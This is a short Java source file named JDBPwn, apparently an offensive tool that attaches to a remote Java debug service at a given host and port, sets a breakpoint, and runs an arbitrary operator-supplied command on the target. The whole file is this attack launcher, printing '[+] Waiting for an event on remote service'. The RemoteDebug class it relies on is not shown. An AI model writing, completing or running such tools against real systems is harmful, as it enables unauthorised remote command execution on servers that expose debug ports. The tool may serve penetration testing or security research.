public class JDBPwn {
	public static void main(String [] main_args) {
		String rhost = main_args[0];
		String rport = main_args[1];
		String bploc = main_args[2];
		String cmd = main_args[3];
		RemoteDebug dbg = new RemoteDebug(rhost, rport, bploc);
		
		try {			 	
			dbg.attach();
		}
		catch(Exception ex) {
			System.out.println("Unable to attach debugger");
			ex.printStackTrace();
			System.exit(1);
		}
		
		try {			 	
			System.out.println("[+] Waiting for an event on remote service");
			dbg.exec(cmd);;
		}
		catch(Exception ex) {
			System.out.println("Unable to exec");
			ex.printStackTrace();
		}    	
	}
}



